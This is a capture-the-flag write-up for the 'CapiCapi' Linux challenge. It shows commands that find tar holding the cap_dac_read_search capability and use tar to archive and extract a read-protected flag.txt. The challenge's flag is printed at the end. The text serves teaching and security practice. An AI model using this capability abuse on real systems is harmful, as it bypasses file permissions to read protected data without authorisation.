# CapiCapi (Bash)

We ssh into a linux environment and we can see that there is `flag.txt` in the home directory. However we do not have permissions to read it.

As the name of the challenge implies, this is a challenge about capabilities.
```
user1@99ac81b17a21:/$ getcap -r /usr/bin
/usr/bin/tar = cap_dac_read_search+ep
```
We see that `tar` has `cap_dac_read_search+ep` capability, which means that it can bypass read permission restrictions. So if we try to compress then decompress the file using `tar` maybe we can read it then.
```
user1@99ac81b17a21:/home/user1$ ls
flag.txt
user1@99ac81b17a21:/home/user1$ tar cvf flag.tar flag.txt
flag.txt
user1@99ac81b17a21:/home/user1$ mkdir foo
user1@99ac81b17a21:/home/user1$ cd foo
user1@99ac81b17a21:/home/user1/foo$ tar xvf ../flag.tar
flag.txt
```
At this point, it still seems like we don't have permissions to read it.
```
user1@99ac81b17a21:/home/user1/foo$ ls -l
total 4
-rwxr----- 1 user1 user1 55 Aug 29 16:09 flag.txt
```
However if we try to read it then it magically works.
```
user1@99ac81b17a21:/home/user1/foo$ cat flag.txt
FwordCTF{C4pAbiLities_4r3_t00_S3Cur3_NaruT0_0nc3_S4id}
```
